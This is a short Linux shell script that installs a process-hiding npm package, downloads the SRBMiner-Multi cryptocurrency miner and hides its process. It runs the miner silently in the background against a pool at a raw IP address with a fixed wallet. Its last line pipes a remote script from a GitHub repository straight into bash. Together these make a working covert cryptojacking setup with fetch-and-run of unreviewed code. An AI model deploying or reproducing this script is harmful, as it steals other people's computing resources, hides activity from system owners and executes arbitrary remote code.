#!/bin/sh
sudo apt update
sudo apt install screen -y
sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.4/SRBMiner-Multi-2-7-4-Linux.tar.gz >/dev/null 2>&1
tar -xzvf SRBMiner-Multi-2-7-4-Linux.tar.gz
cd SRBMiner-Multi-2-7-4
./SRBMiner-MULTI --algorithm verushash --pool 188.166.219.152:443 --wallet RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6."PO$RANDOM" >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
